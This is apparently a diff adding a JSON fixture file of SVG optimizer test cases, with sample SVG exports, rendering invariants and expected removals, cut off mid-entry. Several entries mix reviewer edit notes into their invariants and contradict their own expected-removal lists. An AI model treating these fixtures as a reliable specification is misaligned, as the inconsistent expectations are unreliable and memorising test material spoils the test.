@@ -1,0 +1,430 @@
+[
+  {
+    "name": "ai-shield-badge-flat-classes",
+    "category": "adobe-illustrator-exports",
+    "source": "Adobe Illustrator 25.2.1 SVG Export Plug-In (SVG 1.1, flat .st0/.st1 CSS classes)",
+    "svg": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!-- Generator: Adobe Illustrator 25.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\"\n\t y=\"0px\" viewBox=\"0 0 64 64\" style=\"enable-background:new 0 0 64 64;\" xml:space=\"preserve\">\n<style type=\"text/css\">\n\t.st0{fill:#2B3A67;}\n\t.st1{fill:#F5A623;}\n</style>\n<path class=\"st0\" d=\"M32,2.5459L6.75,11.8018v18.3505c0,15.7182,10.7842,30.4193,25.25,34.1018\n\tc14.4658-3.6825,25.25-18.3836,25.25-34.1018V11.8018L32,2.5459z\"/>\n<path class=\"st1\" d=\"M32,14.6047l4.8541,9.8371l10.8541,1.5773l-7.8541,7.6556l1.8541,10.8098L32,39.3541\n\tl-9.7082,5.1304l1.8541-10.8098l-7.8541-7.6556l10.8541-1.5773L32,14.6047z\"/>\n</svg>\n",
+    "invariants": [
+      "The .st0 rule (fill:#2B3A67) must end up applied to the first (shield) path and the .st1 rule (fill:#F5A623) to the second (star) path -- whether the optimizer keeps the class+style rule or inlines the color as a fill attribute, each shape must still render its correct color.",
+      "Both <path> elements and their exact d geometry (coordinates and command letters) must be preserved; no rounding that alters the rendered outline.",
+      "The two fill colors #2B3A67 and #F5A623 must survive somewhere that reaches the shapes (rule or attribute); neither class may be dropped as 'unused'.",
+      "The rendered raster must be visually identical before and after optimization."
+    ],
+    "expectedRemovals": [
+      "The <?xml ...?> prolog",
+      "The 'Generator: Adobe Illustrator 25.2.1 ... SVG Export Plug-In' comment",
+      "The <!DOCTYPE svg PUBLIC ...> declaration",
+      "The unused xmlns:xlink namespace declaration (no xlink: attribute is used)",
+      "The version=\"1.1\" attribute",
+      "The x=\"0px\" and y=\"0px\" default-zero attributes",
+      "The enable-background style inside the style attribute (deprecated, no filter references it)",
+      "xml:space=\"preserve\" (there are no text nodes)",
+      "id=\"Layer_1\" (never referenced by any url() or href)",
+      "Inter-tag whitespace, tab indentation, and the tab-prefixed d-attribute line wraps"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "ai-cloud-upload-svgid-gradient",
+    "category": "adobe-illustrator-exports",
+    "source": "Adobe Illustrator 23.0.1 SVG Export Plug-In (SVG 1.1, linearGradient referenced via SVGID_1_)",
+    "svg": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!-- Generator: Adobe Illustrator 23.0.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\"\n\t y=\"0px\" viewBox=\"0 0 120 120\" style=\"enable-background:new 0 0 120 120;\" xml:space=\"preserve\">\n<style type=\"text/css\">\n\t.st0{fill:#FFFFFF;}\n</style>\n<linearGradient id=\"SVGID_1_\" gradientUnits=\"userSpaceOnUse\" x1=\"60\" y1=\"8.5\" x2=\"60\" y2=\"111.5\">\n\t<stop  offset=\"0\" style=\"stop-color:#36D1DC\"/>\n\t<stop  offset=\"1\" style=\"stop-color:#5B86E5\"/>\n</linearGradient>\n<circle fill=\"url(#SVGID_1_)\" cx=\"60\" cy=\"60\" r=\"51.5\"/>\n<path class=\"st0\" d=\"M60,33.7523l18.4041,18.4041l-6.3640,6.3640L64.5,50.9723v35.2777h-9V50.9723\n\tl-7.5401,7.5401l-6.3640-6.3640L60,33.7523z\"/>\n</svg>\n",
+    "invariants": [
+      "The id SVGID_1_ must survive verbatim and remain referenced: the disc element must keep fill=\"url(#SVGID_1_)\" so the gradient still paints it. The id and its consuming reference must stay in sync -- neither dropped nor renamed out of agreement.",
+      "The <linearGradient> element must survive with gradientUnits=\"userSpaceOnUse\" and its coordinates x1=60 y1=8.5 x2=60 y2=111.5 intact, and both <stop>s preserved in order (offset 0 -> stop-color #36D1DC, offset 1 -> stop-color #5B86E5), so the gradient renders identically.",
+      "The .st0 rule (fill:#FFFFFF) must end up applied to the arrow path so it renders white (via a surviving rule or an inlined fill attribute).",
+      "The disc's position and size (cx=60 cy=60 r=51.5, or an equivalent path) and the arrow path's d geometry must be preserved.",
+      "The rendered raster must be visually identical before and after optimization."
+    ],
+    "expectedRemovals": [
+      "The <?xml ...?> prolog",
+      "The 'Generator: Adobe Illustrator 23.0.1 ... SVG Export Plug-In' comment",
+      "The <!DOCTYPE svg PUBLIC ...> declaration",
+      "The unused xmlns:xlink namespace declaration (no xlink: attribute is used)",
+      "The version=\"1.1\" attribute",
+      "The x=\"0px\" and y=\"0px\" default-zero attributes",
+      "The enable-background style inside the style attribute",
+      "xml:space=\"preserve\" (there are no text nodes)",
+      "id=\"Layer_1\" (never referenced, unlike SVGID_1_ which must be kept)",
+      "The redundant double space Illustrator emits inside '<stop  offset=...'",
+      "Inter-tag whitespace, tab indentation, and the tab-prefixed d-attribute line wrap"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "inkscape-leaf-icon",
+    "category": "inkscape-export",
+    "source": "Inkscape 1.0.2 (e86c870879) SVG export, plain SVG, single filled path on one layer",
+    "svg": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg\n   xmlns:dc=\"http://purl.org/dc/elements/1.1/\"\n   xmlns:cc=\"http://creativecommons.org/ns#\"\n   xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"\n   xmlns:svg=\"http://www.w3.org/2000/svg\"\n   xmlns=\"http://www.w3.org/2000/svg\"\n   xmlns:sodipodi=\"http://sodipodi.sourceforge.net/DTD/sodipodi-0.0.dtd\"\n   xmlns:inkscape=\"http://www.inkscape.org/namespaces/inkscape\"\n   width=\"48\"\n   height=\"48\"\n   viewBox=\"0 0 48 48\"\n   version=\"1.1\"\n   id=\"svg8\"\n   inkscape:version=\"1.0.2 (e86c870879, 2021-01-15)\"\n   sodipodi:docname=\"leaf.svg\">\n  <defs id=\"defs2\" />\n  <sodipodi:namedview\n     id=\"base\"\n     pagecolor=\"#ffffff\"\n     bordercolor=\"#666666\"\n     borderopacity=\"1.0\"\n     inkscape:pageopacity=\"0.0\"\n     inkscape:pageshadow=\"2\"\n     inkscape:zoom=\"11.313708\"\n     inkscape:cx=\"24.128572\"\n     inkscape:cy=\"24.371429\"\n     inkscape:document-units=\"px\"\n     inkscape:current-layer=\"layer1\"\n     inkscape:window-width=\"1920\"\n     inkscape:window-height=\"1051\"\n     inkscape:window-x=\"0\"\n     inkscape:window-y=\"0\" />\n  <metadata id=\"metadata5\">\n    <rdf:RDF>\n      <cc:Work rdf:about=\"\">\n        <dc:format>image/svg+xml</dc:format>\n        <dc:type rdf:resource=\"http://purl.org/dc/dcmitype/StillImage\" />\n        <dc:title></dc:title>\n      </cc:Work>\n    </rdf:RDF>\n  </metadata>\n  <g\n     inkscape:label=\"Layer 1\"\n     inkscape:groupmode=\"layer\"\n     id=\"layer1\">\n    <path\n       id=\"path12\"\n       d=\"M 24.041667,4.2333333 C 13.229167,10.583333 7.9375,20.108333 12.170833,32.808333 c 1.5875,4.7625 6.879167,8.466667 11.870834,10.583334 C 19.579167,33.866667 22.220833,22.754167 35.983333,14.816667 30.691667,20.108333 25.4,25.929167 27.516667,38.629167 33.866667,32.808333 40.216667,23.283333 35.983333,12.170833 33.866667,6.8791667 28.804167,5.2916667 24.041667,4.2333333 Z\"\n       style=\"fill:#3a7d2c;fill-opacity:1;stroke:none\" />\n  </g>\n</svg>\n",
+    "invariants": [
+      "The single <path> element (id path12) must survive with its d attribute geometry untouched: every M/C/c command, all coordinates, and the mix of absolute (C) and relative (c) segments preserved exactly, and the trailing Z close command kept.",
+      "The path's visible fill color #3a7d2c must be preserved (fill:none is NOT acceptable); the leaf must still render as the same green shape.",
+      "viewBox=\"0 0 48 48\" plus width/height must be preserved so the drawing renders at the same size and position.",
+      "Rendered output must be pixel-identical to the input: same leaf silhouette, same green fill."
+    ],
+    "expectedRemovals": [
+      "The entire <sodipodi:namedview id=\"base\"> element (pagecolor, zoom, window geometry, current-layer) is editor state and should be dropped.",
+      "The entire <metadata id=\"metadata5\"> block including rdf:RDF, cc:Work, dc:format, dc:type, dc:title.",
+      "The editor namespace declarations xmlns:sodipodi, xmlns:inkscape, xmlns:dc, xmlns:cc, xmlns:rdf (and redundant xmlns:svg) once their consumers are gone.",
+      "Root attributes inkscape:version and sodipodi:docname.",
+      "inkscape:label and inkscape:groupmode=\"layer\" on the <g> (the group itself may be unwrapped or kept, but these editor attributes must go).",
+      "The empty <defs id=\"defs2\" /> element.",
+      "Optionally the now-unused id attributes (svg8, defs2, base, metadata5, layer1, path12) and the XML declaration / standalone flag."
+    ],
+    "realistic": true
+  },
+  {
+    "name": "inkscape-check-badge",
+    "category": "inkscape-export",
+    "source": "Inkscape 1.1 (c68e22c387) SVG export, plain SVG, a <circle> and a checkmark <path> on one layer, authored metadata with dc:creator",
+    "svg": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg\n   xmlns:dc=\"http://purl.org/dc/elements/1.1/\"\n   xmlns:cc=\"http://creativecommons.org/ns#\"\n   xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"\n   xmlns:svg=\"http://www.w3.org/2000/svg\"\n   xmlns=\"http://www.w3.org/2000/svg\"\n   xmlns:sodipodi=\"http://sodipodi.sourceforge.net/DTD/sodipodi-0.0.dtd\"\n   xmlns:inkscape=\"http://www.inkscape.org/namespaces/inkscape\"\n   width=\"64\"\n   height=\"64\"\n   viewBox=\"0 0 64 64\"\n   version=\"1.1\"\n   id=\"svg8\"\n   inkscape:version=\"1.1 (c68e22c387, 2021-05-23)\"\n   sodipodi:docname=\"badge.svg\">\n  <sodipodi:namedview\n     id=\"namedview7\"\n     pagecolor=\"#ffffff\"\n     bordercolor=\"#999999\"\n     borderopacity=\"1\"\n     inkscape:showpageshadow=\"2\"\n     inkscape:pageopacity=\"0.0\"\n     inkscape:pagecheckerboard=\"0\"\n     inkscape:deskcolor=\"#d1d1d1\"\n     inkscape:document-units=\"px\"\n     showgrid=\"false\"\n     inkscape:zoom=\"7.375\"\n     inkscape:cx=\"32.135593\"\n     inkscape:cy=\"31.932203\"\n     inkscape:window-width=\"1440\"\n     inkscape:window-height=\"847\"\n     inkscape:window-x=\"0\"\n     inkscape:window-y=\"25\"\n     inkscape:window-maximized=\"1\"\n     inkscape:current-layer=\"layer1\" />\n  <defs id=\"defs2\" />\n  <metadata id=\"metadata5\">\n    <rdf:RDF>\n      <cc:Work rdf:about=\"\">\n        <dc:format>image/svg+xml</dc:format>\n        <dc:type rdf:resource=\"http://purl.org/dc/dcmitype/StillImage\" />\n        <dc:title>badge</dc:title>\n        <dc:creator>\n          <cc:Agent>\n            <dc:title>Jayden Yoon ZK</dc:title>\n          </cc:Agent>\n        </dc:creator>\n      </cc:Work>\n    </rdf:RDF>\n  </metadata>\n  <g\n     inkscape:label=\"Layer 1\"\n     inkscape:groupmode=\"layer\"\n     id=\"layer1\">\n    <circle\n       id=\"path834\"\n       style=\"fill:#1f6feb;fill-opacity:1;stroke:none\"\n       cx=\"32.101695\"\n       cy=\"32.033898\"\n       r=\"27.457628\" />\n    <path\n       id=\"path938\"\n       style=\"fill:#ffffff;fill-opacity:1;stroke:none\"\n       d=\"M 27.152542,42.305085 17.898305,33.050847 21.966102,28.983051 27.152542,34.169492 42.033898,19.288136 46.101695,23.355932 Z\" />\n  </g>\n</svg>\n",
+    "invariants": [
+      "The <circle> (id path834) must survive with its high-precision cx=\"32.101695\", cy=\"32.033898\", r=\"27.457628\" geometry untouched and its fill color #1f6feb preserved.",
+      "The checkmark <path> (id path938) must survive with its d attribute geometry untouched (all M/L implicit lineto coordinates and the trailing Z) and its fill color #ffffff preserved.",
+      "Paint (stroke:none) must not become a visible stroke, and neither fill may be dropped or changed to none.",
+      "Document order must be preserved so the circle stays behind and the white check stays on top; viewBox=\"0 0 64 64\" and width/height kept so it renders at the same scale.",
+      "Rendered output must be pixel-identical: blue disc with a white check in the same positions."
+    ],
+    "expectedRemovals": [
+      "The entire <sodipodi:namedview id=\"namedview7\"> element (page/desk colors, zoom, window geometry, showgrid, current-layer).",
+      "The entire <metadata id=\"metadata5\"> block including rdf:RDF, cc:Work, dc:format, dc:type, dc:title, and the dc:creator / cc:Agent author name.",
+      "The editor namespace declarations xmlns:sodipodi, xmlns:inkscape, xmlns:dc, xmlns:cc, xmlns:rdf (and redundant xmlns:svg) once nothing references them.",
+      "Root attributes inkscape:version and sodipodi:docname.",
+      "inkscape:label and inkscape:groupmode=\"layer\" on the layer <g> (the group may be flattened or kept, but the editor attributes must go).",
+      "The empty <defs id=\"defs2\" /> element.",
+      "Optionally the unused id attributes (svg8, namedview7, defs2, metadata5, layer1, path834, path938) and the XML declaration / standalone flag."
+    ],
+    "realistic": true
+  },
+  {
+    "name": "figma-avatar-icon-clip",
+    "category": "figma-sketch-clippath-mask",
+    "source": "Figma SVG export (24x24 avatar icon, clipPath + evenodd)",
+    "svg": "<svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n<g clip-path=\"url(#clip0_412_1580)\">\n<rect width=\"24\" height=\"24\" rx=\"12\" fill=\"#EEF2FF\"/>\n<path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M12 12C14.2091 12 16 10.2091 16 8C16 5.79086 14.2091 4 12 4C9.79086 4 8 5.79086 8 8C8 10.2091 9.79086 12 12 12ZM12 14C8.68629 14 6 16.6863 6 20V22H18V20C18 16.6863 15.3137 14 12 14Z\" fill=\"#4F46E5\"/>\n</g>\n<defs>\n<clipPath id=\"clip0_412_1580\">\n<rect width=\"24\" height=\"24\" fill=\"white\"/>\n</clipPath>\n</defs>\n</svg>",
+    "invariants": [
+      "clipPath id \"clip0_412_1580\" must survive: the <g> references it via clip-path=\"url(#clip0_412_1580)\", so the id and its clipPath definition must remain live after optimization. (CORRECT as-is)",
+      "The person <path> 'd' geometry (both subpaths: the head circle centered (12,8) r=4, and the torso from y=14 to y=22) must be preserved unchanged - do not merge, reorder, or re-round the coordinates.",
+      "Fill colors must be preserved: rect fill=\"#EEF2FF\", rect rx=\"12\" (rounded background), and path fill=\"#4F46E5\".",
+      "Visual render must be pixel-identical: rounded-rect indigo-tinted background with the indigo person glyph on top. (CORRECT as-is)",
+      "CORRECTED invariant replacing #3: fill-rule=\"evenodd\" on the person path is a visual no-op for THIS artwork because its two subpaths are disjoint (head y in [4,12], torso y in [14,22], 2-unit gap) - evenodd and nonzero render identically. Keeping it is harmless and matches Figma output, but it is NOT load-bearing and there is no overlap/donut effect. Do not assert that dropping it changes rendering.",
+      "CORRECTED classification replacing #4: clip-rule=\"evenodd\" on the person path is inert (the path is a painted child of <g>, not a clipPath child; clip-rule only affects clip geometry, never solid fill). Move it from invariants to expectedRemovals - it can be dropped with no rendering change."
+    ],
+    "expectedRemovals": [
+      "xmlns:xlink is absent so nothing to strip there, but redundant fill=\"none\" on root <svg> may be dropped only if rendering is unchanged",
+      "the clipPath's inner <rect fill=\"white\"> fill attribute is inert for clipping and may be dropped (clip geometry ignores fill)",
+      "whitespace/newlines between elements can be collapsed",
+      "if the optimizer proves the <g clip-path> clip is a no-op because content is within bounds it could inline children, but the safe expectation is it keeps the clip and its id"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "sketch-badge-mask-rect",
+    "category": "figma-sketch-clippath-mask",
+    "source": "Sketch 96 SVG export (32x32 badge, mask + clipPath, evenodd checkmark)",
+    "svg": "<svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<title>badge/verified</title>\n<defs>\n<rect id=\"path-mask0\" x=\"0\" y=\"0\" width=\"32\" height=\"32\" rx=\"16\"/>\n<mask id=\"mask0_2_9\" x=\"0\" y=\"0\" width=\"32\" height=\"32\" fill=\"white\">\n<use xlink:href=\"#path-mask0\"/>\n</mask>\n<clipPath id=\"clip0_2_9\">\n<use xlink:href=\"#path-mask0\"/>\n</clipPath>\n</defs>\n<g stroke=\"none\" stroke-width=\"1\" fill=\"none\" fill-rule=\"evenodd\">\n<g clip-path=\"url(#clip0_2_9)\">\n<rect fill=\"#16A34A\" x=\"0\" y=\"0\" width=\"32\" height=\"32\" rx=\"16\"/>\n<use stroke=\"#BBF7D0\" mask=\"url(#mask0_2_9)\" stroke-width=\"2\" xlink:href=\"#path-mask0\"/>\n<path d=\"M9 16.5L14 21.5L23 11.5\" stroke=\"#FFFFFF\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>\n</g>\n</g>\n</svg>",
+    "invariants": [
+      "ADD invariant: `fill=\"none\"` on the outer wrapper <g> must be preserved because the stroked <use xlink:href=\"#path-mask0\"> sets no fill of its own and inherits fill=\"none\"; removing it makes the <use> fill with the default black, which (through mask0_2_9) covers the badge in black. Move fill=\"none\" out of expectedRemovals into invariants.",
+      "FIX invariant[3]: `fill-rule=\"evenodd\"` on the outer <g> is visually inert in this SVG (no compound or self-intersecting filled paths exist), so its removal would not change rendering. It may be preserved by convention but must not be asserted as render-load-bearing; do not treat an optimizer that drops it as violating the fixture.",
+      "CONFIRMED-correct invariants (hold as written): clip0_2_9 survives (inner <g> clip-path), mask0_2_9 survives (<use> mask=), path-mask0 survives (3 xlink:href refs), the <mask>+child <use> must be preserved (masks the outer half of the 2px inner-ring stroke), xmlns:xlink retained (xlink:href still in use), checkmark path d + stroke-linecap/linejoin round preserved (arc-free M/L polyline).",
+      "CONFIRMED-correct expectedRemovals: <title>, version=\"1.1\", stroke=\"none\"/stroke-width=\"1\" defaults on outer <g>, inter-element whitespace, and the SVG2 href-rewrite-then-drop-xmlns:xlink note are all validly removable without render change."
+    ],
+    "expectedRemovals": [
+      "<title>badge/verified</title> may be removed if the optimizer strips metadata (it is not referenced and not required for rendering)",
+      "version=\"1.1\" attribute on <svg> may be dropped",
+      "stroke=\"none\" stroke-width=\"1\" on the outer <g> are redundant defaults that may be dropped without visual change",
+      "fill=\"none\" on the outer <g> can be dropped only if no descendant relies on inheriting it (children set their own fill), so it is a candidate but must not change rendering",
+      "whitespace/newlines between elements can be collapsed",
+      "if xlink:href were rewritten to href per SVG2 the xmlns:xlink could then be removed, but not before"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "lean-search-icon",
+    "category": "clean-lean-noop",
+    "source": "Hand-written 24x24 stroke icon (Feather/Lucide-style), already minified",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"11\" cy=\"11\" r=\"7\"/><path d=\"M21 21l-4.3-4.3\"/></svg>",
+    "invariants": [
+      "Replace invariant #8 with a render-equivalence form: 'path must draw the same stroke: subpath starts at absolute (21,21) and ends at (16.7,16.7), i.e. a relative -4.3,-4.3 lineto. An optimizer MAY normalize the command syntax (e.g. first moveto M->m, and dropping the explicit l since a lineto is implicit after moveto) as long as both endpoints are unchanged. Do NOT require the literal \"M21 21l-4.3-4.3\" string or the explicit uppercase M / lowercase l letters.'",
+      "Add invariant: 'Root attribute ORDER is not significant; an optimizer may reorder svg attributes (e.g. move stroke-width or viewBox to the end) without breaking equivalence. Checkers must compare the set of attribute name/value pairs, not their source order.'",
+      "Reword expectedRemovals: 'none - no elements or attributes are removed (measured ~0.8% under SVGO default). Permitted equivalence-preserving normalizations are path-command rewriting (M->m, implicit lineto) and attribute reordering, NOT whitespace normalization (the input has no inter-tag whitespace).'"
+    ],
+    "expectedRemovals": [
+      "none — the icon is already minimal; the optimizer may at most normalize insignificant whitespace between tags, and total byte savings should be under ~5%"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "lean-monogram-logo",
+    "category": "clean-lean-noop",
+    "source": "Hand-written minimal monogram logo, filled shapes on a rounded square, already lean",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 48 48\" role=\"img\" aria-label=\"JY monogram\"><title>JY monogram</title><rect width=\"48\" height=\"48\" rx=\"10\" fill=\"#abcf37\"/><path d=\"M18 14v13a4 4 0 0 1-4 4h-2\" fill=\"none\" stroke=\"#1a1a1a\" stroke-width=\"3\" stroke-linecap=\"round\"/><path d=\"M27 14l4 7 4-7m-4 7v10\" fill=\"none\" stroke=\"#1a1a1a\" stroke-width=\"3\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg>",
+    "invariants": [
+      "xmlns='http://www.w3.org/2000/svg' preserved — CONFIRMED present, required for standalone rendering.",
+      "viewBox='0 0 48 48' preserved exactly — CONFIRMED present.",
+      "role='img' and aria-label='JY monogram' preserved — CONFIRMED both present; valid accessibility contract.",
+      "<title>JY monogram</title> preserved with exact text — CONFIRMED present as first child.",
+      "fill='#abcf37' on rect preserved verbatim — CONFIRMED; pairs ab/cf/37 are not repeated-digit, so 3-digit shorthand is impossible (verified programmatically).",
+      "rx='10' on rect preserved — CONFIRMED present.",
+      "fill='none' on both letter paths preserved — CONFIRMED on both; removing it would flood the stroked glyphs with the default black fill.",
+      "stroke='#1a1a1a', stroke-width='3', stroke-linecap='round' survive on both paths — CONFIRMED present on both.",
+      "stroke-linejoin='round' on the Y path survives — CONFIRMED present only on the Y path (the J path deliberately omits it and relies on default miter; a noop optimizer must not add one).",
+      "J path 'd' keeps lowercase relative commands and the arc segment 'a4 4 0 0 1 -4 4' with '0 0 1' intact and unreordered — CONFIRMED; commands present are M v a h (Y path uses M l m v).",
+      "rendered raster pixel-identical before/after — reasonable noop expectation; nothing in this SVG forces a rendering-changing rewrite.",
+      "no new id/class/style attributes introduced — CONFIRMED none present to begin with.",
+      "ADD (implied, worth stating): both #1a1a1a and #abcf37 are un-shortenable, so a correct optimizer performs a true noop (byte delta ~0%), since there is also no inter-tag whitespace to strip."
+    ],
+    "expectedRemovals": [
+      "none of substance — hex colors #abcf37 and #1a1a1a are already 6-digit and cannot be safely shortened to 3-digit equivalents; the optimizer may at most trim insignificant inter-tag whitespace, with total byte savings under ~5%"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "orbiting-loader-spinner",
+    "category": "smil-animation",
+    "source": "Hand-authored inline SVG loading spinner (React component icon)",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"120\" height=\"120\" viewBox=\"0 0 120 120\">\n  <title>Loading</title>\n  <desc>Rotating dashed ring with a pulsing core</desc>\n  <g fill=\"none\" stroke=\"#abcf37\" stroke-width=\"6\" stroke-linecap=\"round\">\n    <circle cx=\"60\" cy=\"60\" r=\"44\" stroke-dasharray=\"70 210\" opacity=\"0.9\">\n      <animateTransform attributeName=\"transform\" type=\"rotate\" from=\"0 60 60\" to=\"360 60 60\" dur=\"1.4s\" repeatCount=\"indefinite\"/>\n    </circle>\n    <circle cx=\"60\" cy=\"60\" r=\"22\" stroke=\"#2b2b2b\" stroke-width=\"4\">\n      <animate attributeName=\"r\" values=\"22;26;22\" dur=\"1.1s\" begin=\"0s\" repeatCount=\"indefinite\"/>\n      <animate attributeName=\"opacity\" values=\"1;0.4;1\" dur=\"1.1s\" repeatCount=\"indefinite\"/>\n    </circle>\n  </g>\n</svg>",
+    "invariants": [
+      "Both <circle> elements are preserved (outer r=44 dashed ring and inner r=22 core).",
+      "The <animateTransform> on the outer circle is preserved with type=\"rotate\", from=\"0 60 60\", to=\"360 60 60\", dur=\"1.4s\", repeatCount=\"indefinite\".",
+      "Both <animate> elements on the inner circle are preserved, including the values lists \"22;26;22\" (attributeName=\"r\") and \"1;0.4;1\" (attributeName=\"opacity\"), each with dur=\"1.1s\" and repeatCount=\"indefinite\".",
+      "begin=\"0s\" on the first inner <animate> may be dropped because it equals the SMIL default begin offset of 0; the <animate> element itself must survive and stay synchronized with the second (which already omits begin).",
+      "The separator between the two numbers in stroke-dasharray=\"70 210\" must be preserved so the value remains two numbers (70 and 210); it must not be collapsed into a single number. The separator character may be a space or a comma (equivalent), so a space→comma substitution is a permissible no-op rather than a violation.",
+      "Rendered animated result is visually identical (title/desc are non-rendering metadata and may be stripped; inter-element whitespace/newlines are insignificant and may be collapsed since there is no xml:space=\"preserve\" and no text content)."
+    ],
+    "expectedRemovals": [
+      "The <title> and <desc> elements may be stripped (metadata, not animation)",
+      "Redundant default begin=\"0s\" attribute may be removed",
+      "Whitespace/newlines between elements collapsed"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "comet-motion-path-badge",
+    "category": "smil-animation",
+    "source": "Figma SVG export, motion added by hand for a hero badge",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"120\" viewBox=\"0 0 200 120\">\n  <defs>\n    <path id=\"trackPath\" d=\"M20,90 C60,10 140,10 180,90\" fill=\"none\"/>\n    <linearGradient id=\"cometFill\" x1=\"0\" y1=\"0\" x2=\"1\" y2=\"0\">\n      <stop offset=\"0\" stop-color=\"#7cf6d0\"/>\n      <stop offset=\"1\" stop-color=\"#abcf37\"/>\n    </linearGradient>\n  </defs>\n  <use href=\"#trackPath\" stroke=\"#1d2b1f\" stroke-width=\"2\" stroke-dasharray=\"3 5\"/>\n  <circle r=\"7\" fill=\"url(#cometFill)\">\n    <animateMotion dur=\"3s\" begin=\"0.2s\" repeatCount=\"indefinite\" rotate=\"auto\">\n      <mpath href=\"#trackPath\"/>\n    </animateMotion>\n    <animate attributeName=\"r\" values=\"7;4;7\" dur=\"3s\" begin=\"0.2s\" repeatCount=\"indefinite\"/>\n  </circle>\n</svg>",
+    "invariants": [
+      "The <path id=\"trackPath\"> in <defs> is preserved with its id intact, because both <use href=\"#trackPath\"> and <mpath href=\"#trackPath\"> reference it (verified: exactly one id=\"trackPath\", two #trackPath references).",
+      "The geometry of the path d=\"M20,90 C60,10 140,10 180,90\" is preserved so the rendered curve is identical; coordinate formatting may be normalized to an equivalent form (comma/space, absolute/relative) per expectedRemovals, but the resulting single cubic Bezier, its start point, and its direction must be unchanged because it drives both the <use> stroke and the animateMotion path.",
+      "The fill=\"none\" on <path id=\"trackPath\"> is preserved, because the path is rendered through <use href=\"#trackPath\"> as a stroked track; dropping fill=\"none\" would fill the curve with the default black and visibly change the result.",
+      "The <animateMotion> element is preserved with dur=\"3s\", begin=\"0.2s\", repeatCount=\"indefinite\", rotate=\"auto\".",
+      "The child <mpath href=\"#trackPath\"/> inside <animateMotion> is preserved and its href still resolves to the surviving path id.",
+      "The sibling <animate> on r with values=\"7;4;7\", dur=\"3s\", begin=\"0.2s\", repeatCount=\"indefinite\" is preserved.",
+      "The linearGradient id=\"cometFill\" (with both stops) is preserved because <circle fill=\"url(#cometFill)\"> references it (verified: one id=\"cometFill\", one url(#cometFill) reference).",
+      "Rendered animated result is visually identical."
+    ],
+    "expectedRemovals": [
+      "Whitespace/indentation between elements may be collapsed",
+      "No structural elements may be removed; the only safe changes are whitespace normalization and equivalent numeric/attribute formatting"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "connector-diagram-xlink-refs",
+    "category": "reference-aware-id-handling",
+    "source": "Hand-authored SVG mimicking a Sketch/hand-coded connector diagram export",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 240 160\" width=\"240\" height=\"160\">\n  <defs>\n    <linearGradient id=\"g1\" x1=\"0\" y1=\"0\" x2=\"1\" y2=\"1\">\n      <stop offset=\"0\" stop-color=\"#abcf37\"/>\n      <stop offset=\"1\" stop-color=\"#5c7a12\"/>\n    </linearGradient>\n    <radialGradient id=\"g2\" cx=\"0.5\" cy=\"0.4\" r=\"0.6\">\n      <stop offset=\"0\" stop-color=\"#ffffff\"/>\n      <stop offset=\"1\" stop-color=\"#d9e6a0\"/>\n    </radialGradient>\n    <filter id=\"f1\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur in=\"SourceAlpha\" stdDeviation=\"2\"/>\n      <feOffset dy=\"2\" result=\"o\"/>\n      <feMerge><feMergeNode in=\"o\"/><feMergeNode in=\"SourceGraphic\"/></feMerge>\n    </filter>\n    <pattern id=\"p1\" width=\"8\" height=\"8\" patternUnits=\"userSpaceOnUse\">\n      <rect width=\"8\" height=\"8\" fill=\"#f4f1e6\"/>\n      <circle cx=\"2\" cy=\"2\" r=\"1\" fill=\"#abcf37\"/>\n    </pattern>\n    <marker id=\"arrow\" markerWidth=\"8\" markerHeight=\"8\" refX=\"6\" refY=\"3\" orient=\"auto\">\n      <path d=\"M0,0 L6,3 L0,6 Z\" fill=\"#5c7a12\"/>\n    </marker>\n    <circle id=\"shape1\" cx=\"0\" cy=\"0\" r=\"14\" fill=\"url(#g2)\" stroke=\"#5c7a12\"/>\n    <rect id=\"unused1\" x=\"0\" y=\"0\" width=\"10\" height=\"10\" fill=\"#000000\"/>\n  </defs>\n  